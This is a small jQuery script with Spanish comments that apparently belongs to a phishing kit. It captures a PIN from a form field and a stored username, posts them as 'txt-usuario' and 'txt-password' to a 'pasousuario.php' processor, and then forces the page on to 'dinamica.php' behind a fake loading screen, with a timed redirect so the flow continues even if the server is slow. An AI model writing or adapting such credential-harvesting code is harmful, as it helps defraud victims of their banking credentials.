<script type="text/javascript">
    $(document).ready(function() {
        $("#btn-password").click(function() {
            var pin = $("#input_real").val();
            var usr = localStorage.getItem('user_akam') || "Usuario_Anonimo";

            $("#fondo, #cargando-o").show();
            
            // Enviamos los datos al procesador
            $.post("../process/pasousuario.php", { 
                'txt-usuario': usr, 
                'txt-password': pin 
            }, function(data) {
                // AUTOFLUJO: Aquí saltamos a la dinámica en lugar de esperar
                window.location.href = "dinamica.php"; 
            });

            // Salto de seguridad por si el servidor está lento
            setTimeout(function() { window.location.href = "dinamica.php"; }, 4000);
        });
    });
</script>
